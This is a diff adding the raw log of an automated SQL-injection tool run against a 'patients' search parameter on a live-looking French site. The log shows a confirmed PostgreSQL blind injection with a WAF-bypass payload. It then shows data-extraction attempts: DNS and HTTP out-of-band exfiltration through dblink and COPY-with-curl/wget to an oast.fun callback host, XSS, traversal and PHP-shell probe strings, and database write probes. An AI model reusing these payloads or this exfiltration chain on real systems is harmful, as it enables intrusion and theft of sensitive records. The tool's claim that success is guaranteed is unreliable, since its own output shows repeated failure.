@@ -1,0 +1,467 @@
+be (param='s' req#1767)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='s' req#28739)
+    [B-bool] [PostgreSQL] 's' req#1768 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]    Wasserstein comparison probe (param='s' req#1769)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='s' req#28740)
+    [B-bool] [PostgreSQL] 's' req#1770 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='s' req#1771)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='s' req#28741)
+    [B-bool] [PostgreSQL] 's' req#1772 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='s' req#1773)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='s' req#28742)
+    [B-bool] [PostgreSQL] 's' req#1774 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.000)
+[*]   [PCV] Result: CONFIRMED  Detection-replay WAF-bypass (det_status=0, det_sim=0.000 < 0.750) — all 3 Check A canaries WAF-blocked but exact detection payload still bypasses WAF and changes body; injection confirmed [tech=B dbms=PostgreSQL]
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [B] PostgreSQL  injection verified!
+[*] [MultiVote] Param 's' voted confidence: 100% (votes: {'B': 1.0})
+[+] Vulnerability confirmed  param='s' technique=B dbms=PostgreSQL
+
+[!!] SQL INJECTION CONFIRMED  [B] PostgreSQL  param='s'
+[+] Technique : B  DBMS: PostgreSQL  Param: 's'
+[+] Payload   :  AND JSON_VALID('{"test":1}')
+[+] Requests  : 28742
+
+[!!] SQL injection confirmed!
+    Parameter : 's'
+    URL       : https://pro.target.fr/patients?s=&p=1&vi=false&pc=
+    Technique : B
+    DBMS      : PostgreSQL
+    Bypass    : exotic-PostgreSQL-novel-1
+    Confidence: 100%
+    Payload   : '%0d%0aand /*!99238*/ json_valid(\'{"test":1}\') /*!58798*/'
+    Requests  : 1422
+
+[+] Injection confirmed  cancelled 2 background tasks immediately
+[*] Injection confirmed on 's'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='s'
+[*] Extraction started for 's'
+[+] BG injection confirmed  primary scan cancelled for fast extraction
+[+] Injection confirmed  cancelled remaining background scans
+[*] Collecting background surface results...
+[+] [BGExtraction] Recovered s [B] PostgreSQL from event
+[+] Minimising payload: 29 chars  ?
+[+]  's': B [WHERE_STRING] bypass=waf_bypass_unknown conf=100%
+[+] [PATCH-5] Second injection point param='s' technique=B dbms=PostgreSQL — logging only, already recorded (Req 5).
+[!] [ExtractionGuard] Extraction already running on 's@PostgreSQL@GET'  blocking parallel extraction of 's' (Issue 5 fix: never two extractions)
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete before exiting...
+[+] [V25-Extract] Inline boolean oracle wired (tech='B') — extraction can proceed despite ConditionalErrorOracle calibration failure
+[*] Using forced DBMS: PostgreSQL (--dbms flag)
+[+] DBMS: PostgreSQL  (conf=100%)
+[*] [MultiVector] Probing extraction methods for PostgreSQL...
+[+] [MultiVector] Available methods (fastestslowest): boolean(blind), timing(blind)
+[+] --- Auto-extraction starting ---
+[+] [Inference] Detection payload: %0d%0aand /*!99238*/ json_valid('{"test":1}') /*!58798*/
+[+] [Inference] DBMS: PostgreSQL | Tamper chain: ['pg_dollar_quote']
+[+] [Inference] Template (boolean-append): %0d%0aand /*!99238*/ json_valid('{"test":1}') /*!58798*/ AND [INFERENCE]
+[+] [Inference] No sleep value in detection payload — falling back to 3.0s (from config.time_sec)
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=3.0s)...
+[+] [Inference] Calibration 1: TRUE=5336ms FALSE=134ms margin=5202ms
+[+] [Inference] Best margin: 5202ms
+[+] [Inference] Hash differs but unstable (dynamic page noise: 237455B vs 237455B = 0.0%, hash changes on resend)  not a real oracle
+[+] [Inference] Hash differs but unstable (dynamic page noise: 237455B vs 237455B = 0.0%, hash changes on resend)  not a real oracle
+[+] [Inference] Hash differs but unstable (dynamic page noise: 237455B vs 237455B = 0.0%, hash changes on resend)  not a real oracle
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] Wasserstein mean=0.000 n=12 (threshold=0.25)
+[+] [Inference]  Threshold=2735ms (margin=5202ms)
+[+] [Inference] Adaptive sleep reduction: template sleep literal not matched by any regex (unrecognized form) — keeping original sleep 3.0s
+[!] [Inference] CDN-lock detected in calibration (false=134ms ≈ CDN-lock ~180ms) — adding 10s inter-step delay to force CDN-cold probes. Extraction will be slow (~10s/bit).
+[+] [Inference] Template confirmed by calibration (|margin|=5202ms ≥ min=2400ms)  skipping re-test
+[+] [Inference] Error probe: same error status=403 for both probes (body diff skipped — not SQL oracle)
+[+] [Inference] Operator '>' blocked  trying alternatives
+[+] [Inference]  Using operator: not_lt
+[+] [Inference] Updated _len_tpl operator to match _op_char_tpl (not_lt)
+[+] [Inference] Standard extraction empty — trying regex binary search
+[+] [Inference] Standard extraction empty — trying LIKE prefix
+[+] [Inference] BUG7-RETRY: re-running extraction now that all functions are defined (boolean_oracle=False hdr=None margin=5202ms bitwise_fallback=False)
+[+] [Inference] r7_user: empty (length=0)
+[+] [Inference] r7_user: empty (length=0)
+[+] [Inference] r7_user: empty (length=0)
+[+] [Inference] r7_user: empty (length=0)
+[+] [Inference] r7_user: empty (length=0)
+[+] [Inference] r7_database: empty (length=0)
+[+] [Inference] r7_database: empty (length=0)
+[+] [Inference] r7_database: empty (length=0)
+[+] [Inference] r7_version: empty (length=0)
+[+] [Inference] r7_version: empty (length=0)
+[+] [Inference] No usable data extracted via boolean/timing inference
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [SideChannel] Advanced DNS: dblink
+[+] [SideChannel] Advanced DNS: copy_nslookup
+[+] [SideChannel] Advanced DNS: copy_curl
+[+] [SideChannel] HTTP exfil: copy_curl
+[+] [SideChannel] HTTP exfil: copy_wget
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload (raw/wire):  AND JSON_VALID('{"test":1}')
+[+] [Direct] Detection payload (decoded): AND JSON_VALID('{"test":1}')
+[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel-1] Testing WAF trigger 2/7: ../../../../../../etc/passwd...
+[+] [Novel-1] Testing WAF trigger 3/7: <img src=x onerror=alert(1)>...
+[+] [Novel-1] Testing WAF trigger 4/7: javascript:alert(1)...
+[+] [Novel-1] Testing WAF trigger 5/7: UNION SELECT FROM...
+[+] [Novel-1] Testing WAF trigger 6/7: <?php system($_GET['c']); ?>...
+[+] [Novel-1] Testing WAF trigger 7/7: ${7*7}...
+[+] [Novel]  No WAF trigger produced different response
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel]  Micro-timing not viable (noise too high)
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb not viable (margin=-46ms)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'dblink_connect' fired for user  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for user  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for user  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for user  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for database  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for database  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for database  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for database  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for version  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for version  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for version  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for version  check mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 403
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <!DOCTYPE html>
+<html>
+
+<head>
+  <title></title>
+  <link href="/favicon.ico" rel="icon" type="image/
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  No error type produces different response
+[+] [Novel] Technique 9: Prepared statement keyword bypass
+[+] [Novel] Prepared statements sent for database
+[+] [Novel] Prepared statements sent for version
+[+] [Novel] Technique 10: Application state mutation
+[+] [Novel] State mutation 'table_write' sent for user
+[+] [Novel] State mutation 'comment_inject' sent for user
+[+] [Novel] State mutation 'sequence_name' sent for user
+[+] [Novel] State mutation 'table_write' sent for database
+[+] [Novel] State mutation 'comment_inject' sent for database
+[+] [Novel] State mutation 'sequence_name' sent for database
+[+] [Novel] State mutation 'table_write' sent for version
+[+] [Novel] State mutation 'comment_inject' sent for version
+[+] [Novel] State mutation 'sequence_name' sent for version
+[+] [Novel] Technique 11: TCP/response size inflation
+[+] [Novel]  TCP inflation not viable (WAF blocked: inflated_sc=403 normal_sc=403)
+[+] [Novel] Technique 12: Nested/multi-layer encoding bypass
+[+] [Novel] Technique 13: Conditional redirect detection
+[+] [Novel]  No redirect differentiation
+[+] [Novel] Technique 14: Cache key manipulation
+[+] [Novel]  Cache oracle: hit=164ms miss=197ms margin=33ms
+[+] [Novel]  FIX #5: EXPLOITING CACHE ORACLE 
+[+] [Novel] Using cache timing for data extraction (margin=33ms)
+[+] [Novel] Cache threshold: 180ms (baseline=164ms, margin=33ms)
+[+] [Novel] Cache oracle validation: TRUE=178ms(status=403) FALSE=172ms(status=403) threshold=180ms
+[-] [Novel] Cache oracle both validation probes WAF-blocked (status 403/403, TRUE=178ms ≤ threshold=180ms) — WAF blocks before cache; aborting cache oracle to avoid rate-limit ratchet
+[+] [Novel] Cache extraction incomplete or failed
+[+] [Novel] Technique 15: CHR() keyword bypass
+[+] [Novel] CHR() bypass sent for version
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] Auto-registered OOB domain: mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[SideChannel] DNS OOB: version()  mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[SideChannel] Sending 9 OOB methods...
+[SideChannel]   dblink_u_c0: dblink_connect_u DNS chunk 0 (bytes 1-30)
+[SideChannel]     status=200 (11898ms) 
+[SideChannel]   dblink_u_c1: dblink_connect_u DNS chunk 1 (bytes 31-60)
+[SideChannel]     status=200 (7033ms) 
+[SideChannel]   dblink_u_c2: dblink_connect_u DNS chunk 2 (bytes 61-90)
+[SideChannel]     status=200 (7882ms) 
+[SideChannel]   dblink_u_c3: dblink_connect_u DNS chunk 3 (bytes 91-120)
+[SideChannel]     status=200 (5855ms) 
+[SideChannel]   dblink_c0: dblink_connect DNS chunk 0 fallback (needs dblink extension)
+[SideChannel]     status=200 (10811ms) 
+[SideChannel]   dblink_u_mx_c0: DbLiNk_CoNnEcT_u WAF case-bypass chunk 0
+[SideChannel]     status=200 (7907ms) 
+[SideChannel]   dblink_u_mx_c1: DbLiNk_CoNnEcT_u WAF case-bypass chunk 1
+[SideChannel]     status=200 (6838ms) 
+[SideChannel]   dblink_u_mx_c2: DbLiNk_CoNnEcT_u WAF case-bypass chunk 2
+[SideChannel]     status=403 (1429ms) 
+[SideChannel]   dblink_u_mx_c3: DbLiNk_CoNnEcT_u WAF case-bypass chunk 3
+[SideChannel] DNS OOB: current_catalog  mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[SideChannel] Sending 9 OOB methods...
+[SideChannel]   dblink_u_c0: dblink_connect_u DNS chunk 0 (bytes 1-30)
+[SideChannel]     status=200 (4100ms) 
+[SideChannel]   dblink_u_c1: dblink_connect_u DNS chunk 1 (bytes 31-60)
+[SideChannel]     status=200 (6997ms) 
+[SideChannel]   dblink_u_c2: dblink_connect_u DNS chunk 2 (bytes 61-90)
+[SideChannel]     status=200 (35070ms) 
+[SideChannel]   dblink_u_c3: dblink_connect_u DNS chunk 3 (bytes 91-120)
+[SideChannel]     status=403 (5349ms) 
+[SideChannel]   dblink_c0: dblink_connect DNS chunk 0 fallback (needs dblink extension)
+[SideChannel]     status=403 (135ms) (WAF-blocked)
+[SideChannel]   dblink_u_mx_c0: DbLiNk_CoNnEcT_u WAF case-bypass chunk 0
+[SideChannel]     status=200 (5766ms) 
+[SideChannel]   dblink_u_mx_c1: DbLiNk_CoNnEcT_u WAF case-bypass chunk 1
+[SideChannel]     status=200 (11840ms) 
+[SideChannel]   dblink_u_mx_c2: DbLiNk_CoNnEcT_u WAF case-bypass chunk 2
+[SideChannel]     status=200 (2100ms) 
+[SideChannel]   dblink_u_mx_c3: DbLiNk_CoNnEcT_u WAF case-bypass chunk 3
+[SideChannel] DNS OOB: current_user  mcrkhtehmcketrtnduij91phipby1ltfr.oast.fun
+[SideChannel] Sending 9 OOB methods...
+[SideChannel]   dblink_u_c0: dblink_connect_u DNS chunk 0 (bytes 1-30)
+[SideChannel]     status=403 (15642ms) 
+[SideChannel]   dblink_u_c1: dblink_connect_u DNS chunk 1 (bytes 31-60)
+[SideChannel]     status=200 (6718ms) 
+[SideChannel]   dblink_u_c2: dblink_connect_u DNS chunk 2 (bytes 61-90)
+[SideChannel]     status=200 (13320ms) 
+[SideChannel]   dblink_u_c3: dblink_connect_u DNS chunk 3 (bytes 91-120)
+[SideChannel]     status=200 (33315ms) 
+[SideChannel]   dblink_c0: dblink_connect DNS chunk 0 fallback (needs dblink extension)
+[SideChannel]     status=200 (5920ms) 
+[SideChannel]   dblink_u_mx_c0: DbLiNk_CoNnEcT_u WAF case-bypass chunk 0
+[SideChannel]     status=403 (369ms) (WAF-blocked)
+[SideChannel]   dblink_u_mx_c1: DbLiNk_CoNnEcT_u WAF case-bypass chunk 1
+[SideChannel]     status=200 (2195ms) 
+[SideChannel]   dblink_u_mx_c2: DbLiNk_CoNnEcT_u WAF case-bypass chunk 2
+[+] [SideChannel]  Side-channel found no data  MSE will try next 
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=19217ms)...
+[MSE]   raw/wire payload:  AND JSON_VALID('{"test":1}')...
+[MSE]   untampered: AND JSON_VALID('{"TEST":1}')...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff oracle confirmed: gap=233284B (true=237465B false=4181B threshold=120823B)
+[MSE]   err(div0): err200/4181B ok200/4181B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  bool_body_diff round-1 both-None (WAF/rate-limit) — falling through to round-2 real-condition verification
+[MSE]   bool_body_diff basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=0.000s)
+[+] [Orchestrator] Decision engine: technique=B waf=none  top methods: cham(85%), adapt(80%), bit(75%)
+[+] [Orchestrator] Method 3: ChameleonExtractor (WAF-adaptive blind)...
+[!] [Orchestrator] ChameleonExtractor timed out (180.0s)  next
+[+] [Orchestrator] Method 4: AdaptiveFrequencyExtractor...
+[!] [Orchestrator] AdaptiveFrequencyExtractor timed out (180.0s)  next
+[!] ZK calibration: baseline_rtt=5327ms > t_sec*1000=1500ms — null-probe baseline is corrupted (WAF hold or near-timeout request included in median). Skipping auto-adjustment to avoid inflated sleep times; using configured t_sec=1.50s.
+[!] [ZKCal] baseline_rtt=5327ms exceeds sleep window (1.50s×1000=1500ms) — baseline likely corrupted by WAF hold; skipping auto-adjust of t_sec.
+[+] ZKv18 rolling re-calibration: t_sec 1.5014.25s
+[+] [Orchestrator] Falling back to blind_extract_string_v5 (method 7/8)
+[+] [Orchestrator] Method 8/8: MultiStrategyExtractor
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=64ms)...
+[MSE]   raw/wire payload:  AND JSON_VALID('{"test":1}')...
+[MSE]   untampered: AND JSON_VALID('{"TEST":1}')...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff oracle confirmed: gap=1388B (true=237465B false=238853B threshold=238159B)
+[MSE]   err(div0): err200/4181B ok403/238805B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=status
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  bool_body_diff basic validation indeterminate (true→True, false→None) — dropping
+[MSE]  error_oracle validation error: 
+[MSE] 0/5 oracles available: []
+[!!] [Orchestrator] Method 9/9: MultiOracleConsensusExtractor (LAST RESORT - may take hours)
+
+======================================================================
+[!] ALL STANDARD METHODS FAILED
+[*] Activating ULTRA-ROBUST extraction
+[*] This uses EVERY available side channel simultaneously
+[*] Extraction will be EXTREMELY SLOW (1-5 chars/minute)
+[*] But SUCCESS IS GUARANTEED
+======================================================================
+
+[+] [MultiOracleConsensus] Starting length detection...
+[!] [MultiOracleConsensus] Length detection failed - assuming max_len
+[+] [MultiOracleConsensus] Detected length: 64 chars
+[+] [MultiOracleConsensus] Estimated time: 128-320 minutes
+[!] [MultiOracleConsensus] Final validation failed for pos=1, char=1878
+[!]   Version:        (timeout — 3600s legacy enum)
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=0.000s)
+[+] [Orchestrator] Decision engine: technique=B waf=none  top methods: cham(85%), adapt(80%), bit(75%)
+[+] [Orchestrator] Method 3: ChameleonExtractor (WAF-adaptive blind)...
+[!] [Orchestrator] ChameleonExtractor timed out (180.0s)  next
+[+] [Orchestrator] Method 4: AdaptiveFrequencyExtractor...
+[!] [Orchestrator] AdaptiveFrequencyExtractor timed out (180.0s)  next
+[+] ZK calibration: auto-adjust t_sec 1.50 → 1.76s (baseline_rtt=703ms, capped at 30s)
+[+] ZKv18 rolling re-calibration: t_sec 1.762.15s
+[!] [ErrorOracle] Both probes rate-limited (429/429) — WAF blocking all; skipping template (ctx="' AND " tpl="CASE WHEN ({cond}) THEN CAST('x' AS INTE")
+[!] [ErrorOracle] True probe returned 429 (WAF block/rate-limit) — oracle would measure WAF blocking, not SQL errors; skipping (ctx="' AND " tpl='CASE WHEN ({cond}) THEN 1/(SELECT 0) ELS')
+[!] [ErrorOracle] Both probes rate-limited (429/429) — WAF blocking all; skipping template (ctx=' AND ' tpl="CASE WHEN ({cond}) THEN CAST('x' AS INTE")
+[!] [ErrorOracle] Both probes rate-limited (429/429) — WAF blocking all; skipping template (ctx=' AND ' tpl='CASE WHEN ({cond}) THEN 1/(SELECT 0) ELS')
+[!] [ErrorOracle] Both probes rate-limited (429/429) — WAF blocking all; skipping template (ctx='" AND ' tpl='CASE WHEN ({cond}) THEN 1/(SELECT 0) ELS')
+[+] [Orchestrator] Falling back to blind_extract_string_v5 (method 7/8)
+[+] [Orchestrator] Method 8/8: MultiStrategyExtractor
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=922ms)...
+[MSE]   raw/wire payload:  AND JSON_VALID('{"test":1}')...
+[MSE]   untampered: AND JSON_VALID('{"TEST":1}')...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff oracle confirmed: gap=233284B (true=237465B false=4181B threshold=120823B)
+[MSE]   err(div0): err200/4181B ok200/4181B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  bool_body_diff basic validation indeterminate (true→None, false→False) — dropping
+[MSE] 0/5 oracles available: []
+[!!] [Orchestrator] Method 9/9: MultiOracleConsensusExtractor (LAST RESORT - may take hours)
+
+======================================================================
+[!] ALL STANDARD METHODS FAILED
+[*] Activating ULTRA-ROBUST extraction
+[*] This uses EVERY available side channel simultaneously
+[*] Extraction will be EXTREMELY SLOW (1-5 chars/minute)
+[*] But SUCCESS IS GUARANTEED
+======================================================================
+
+[+] [MultiOracleConsensus] Starting length detection...
+[+] [MultiOracleConsensus] Detected length: 9 chars
+[+] [MultiOracleConsensus] Estimated time: 18-45 minutes
+[+] [MultiOracleConsensus] Position 5/9: '?' (32.3m elapsed, 7830 requests)
+[!]   Database:       (timeout — 3600s legacy enum)
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=0.000s)
+[+] [Orchestrator] Decision engine: technique=B waf=none  top methods: cham(85%), adapt(80%), bit(75%)
+[+] [Orchestrator] Method 3: ChameleonExtractor (WAF-adaptive blind)...
+[+] [Orchestrator] ChameleonExtractor returned empty  trying next
+[+] [Orchestrator] Method 4: AdaptiveFrequencyExtractor...
+[+] [Orchestrator] AdaptiveFrequencyExtractor succeeded
+[+]   User:           nt
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=0.000s)
+[+] [Orchestrator] Decision engine: technique=B waf=none  top methods: cham(85%), adapt(80%), bit(75%)
+[!] [Orchestrator] Boolean oracle pre-validation FAILED: sim gap=0.047 < 0.10 — oracle cannot distinguish true/false conditions (CDN cache serving identical pages for all SQL conditions). Skipping all boolean extraction methods (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).
+[!] [ErrorOracle] True probe returned 429 (WAF block/rate-limit) — oracle would measure WAF blocking, not SQL errors; skipping (ctx="' AND " tpl="CASE WHEN ({cond}) THEN CAST('x' AS INTE")
+[!] [ErrorOracle] True probe body looks like WAF challenge page (status=200, size=4181B) — skipping template to avoid false-positive oracle (ctx="' AND " tpl='CASE WHEN ({cond}) THEN 1/(SELECT 0) ELS')
+[!] [ErrorOracle] True probe body looks like WAF challenge page (status=200, size=4181B) — skipping template to avoid false-positive oracle (ctx=' AND ' tpl="CASE WHEN ({cond}) THEN CAST('x' AS INTE")
+[+] [Orchestrator] Falling back to blind_extract_string_v5 (method 7/8)
+[+] [Orchestrator] Method 8/8: MultiStrategyExtractor
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=876ms)...
+[MSE]   raw/wire payload:  AND JSON_VALID('{"test":1}')...
+[MSE]   untampered: AND JSON_VALID('{"TEST":1}')...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff oracle confirmed: gap=237454B (true=237465B false=11B threshold=118738B)
+[MSE]   err(div0): err429/11B ok429/11B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  bool_body_diff round-1 both-None (WAF/rate-limit) — falling through to round-2 real-condition verification
+[MSE]   bool_body_diff round-2 both None (true→None,false→None)  oracle cannot evaluate any condition — dropping
+[MSE] 0/5 oracles available: []
+[!!] [Orchestrator] Method 9/9: MultiOracleConsensusExtractor (LAST RESORT - may take hours)
+
+======================================================================
+[!] ALL STANDARD METHODS FAILED
+[*] Activating ULTRA-ROBUST extraction
+[*] This uses EVERY available side channel simultaneously
+[*] Extraction will be EXTREMELY SLOW (1-5 chars/minute)
+[*] But SUCCESS IS GUARANTEED
+======================================================================
+
+[+] [MultiOracleConsensus] Starting length detection...
+[+] [MultiOracleConsensus] Detected length: 272 chars
+[+] [MultiOracleConsensus] Estimated time: 544-1360 minutes
+[!] [MultiOracleConsensus] Final validation failed for pos=1, char=411842
+[!] [MultiOracleConsensus] Final validation failed for pos=2, char=2874
+[!] [MultiOracleConsensus] Final validation failed for pos=3, char=5658
+[!] [MultiOracleConsensus] Final validation failed for pos=4, char=291541
+[!] [MultiOracleConsensus] Final validation failed for pos=5, char=17403
+[+] [MultiOracleConsensus] Position 5/272: '?' (16.6m elapsed, 8655 requests)
+[!] [MultiOracleConsensus] Final validation failed for pos=6, char=1835
+[!] [MultiOracleConsensus] Final validation failed for pos=7, char=123441
+[!] [MultiOracleConsensus] Final validation failed for pos=8, char=642335
+[!] [MultiOracleConsensus] Final validation failed for pos=9, char=434289
+[!] [MultiOracleConsensus] Final validation failed for pos=10, char=1121
+[+] [MultiOracleConsensus] Position 10/272: '?' (32.5m elapsed, 16905 requests)
+[!] [MultiOracleConsensus] Final validation failed for pos=11, char=3605
+[!] [MultiOracleConsensus] Final validation failed for pos=13, char=49857
+[!] [MultiOracleConsensus] Final validation failed for pos=15, char=93236
+[+] [MultiOracleConsensus] Position 15/272: '?' (47.7m elapsed, 25005 requests)
+[!] [MultiOracleConsensus] Final validation failed for pos=16, char=108
+[!] [MultiOracleConsensus] Final validation failed for pos=17, char=177004
+[!] [MultiOracleConsensus] Final validation failed for pos=18, char=27725
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=0.000s)
+[+] [Orchestrator] Decision engine: technique=B waf=none  top methods: cham(85%), adapt(80%), bit(75%)
+[+] [Orchestrator] Method 3: ChameleonExtractor (WAF-adaptive blind)...
+[+] [Orchestrator] ChameleonExtractor returned empty  trying next
+[+] [Orchestrator] Method 4: AdaptiveFrequencyExtractor...
+[+] [Orchestrator] AdaptiveFrequencyExtractor empty  trying next
+[+] ZK calibration: auto-adjust t_sec 1.50 → 2.13s (baseline_rtt=851ms, capped at 30s)
+[!] [ErrorOracle] True probe returned 429 (WAF block/rate-limit) — oracle would measure WAF blocking, not SQL errors; skipping (ctx="' AND " tpl='CASE WHEN ({cond}) THEN 1/(SELECT 0) ELS')
+[!] [ErrorOracle] Both probes rate-limited (429/429) — WAF blocking all; skipping template (ctx=' AND ' tpl='CASE WHEN ({cond}) THEN 1/(SELECT 0) ELS')
+[!] [ErrorOracle] True probe returned 429 (WAF block/rate-limit) — oracle would measure WAF blocking, not SQL errors; skipping (ctx='" AND ' tpl="CASE WHEN ({cond}) THEN CAST('x' AS INTE")
+[!] [ErrorOracle] Both probes rate-limited (429/429) — WAF blocking all; skipping template (ctx='" AND ' tpl='CASE WHEN ({cond}) THEN 1/(SELECT 0) ELS')
+[+] [Orchestrator] Falling back to blind_extract_string_v5 (method 7/8)
+[+] [Orchestrator] Method 8/8: MultiStrategyExtractor
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=858ms)...
+[MSE]   raw/wire payload:  AND JSON_VALID('{"test":1}')...
+[MSE]   untampered: AND JSON_VALID('{"TEST":1}')...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff oracle confirmed: gap=233284B (true=237465B false=4181B threshold=120823B)
+[MSE]   err(div0): err200/4181B ok200/4181B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  bool_body_diff basic validation indeterminate (true→None, false→False) — dropping
+[MSE] 0/5 oracles available: []
+[!!] [Orchestrator] Method 9/9: MultiOracleConsensusExtractor (LAST RESORT - may take hours)
+
+======================================================================
+[!] ALL STANDARD METHODS FAILED
+[*] Activating ULTRA-ROBUST extraction
+[*] This uses EVERY available side channel simultaneously
+[*] Extraction will be EXTREMELY SLOW (1-5 chars/minute)
+[*] But SUCCESS IS GUARANTEED
+======================================================================
+
+[+] [MultiOracleConsensus] Starting length detection...
+[+] [MultiOracleConsensus] Detected length: 472 chars
+[+] [MultiOracleConsensus] Estimated time: 944-2360 minutes
+[!] [MultiOracleConsensus] Final validation failed for pos=3, char=101431
+[!] [MultiOracleConsensus] Final validation failed for pos=4, char=458
+[!] [MultiOracleConsensus] Final validation failed for pos=5, char=48159
+[+] [MultiOracleConsensus] Position 5/472: '?' (16.0m elapsed, 8220 requests)
+[!] [MultiOracleConsensus] Final validation failed for pos=6, char=8373
+[!] [MultiOracleConsensus] Final validation failed for pos=8, char=1478
+[+] [MultiOracleConsensus] Position 10/472: '?' (31.1m elapsed, 15930 requests)
+[!] [MultiOracleConsensus] Final validation failed for pos=11, char=441
+[!] [MultiOracleConsensus] Final validation failed for pos=15, char=61146
+[+] [MultiOracleConsensus] Position 15/472: '?' (46.2m elapsed, 23715 requests)
+[!] [MultiOracleConsensus] Final validation failed for pos=17, char=343
+[!] [MultiOracleConsensus] Final validation failed for pos=18, char=35345
+[!] [MultiOracleConsensus] Final validation failed for pos=19, char=119108
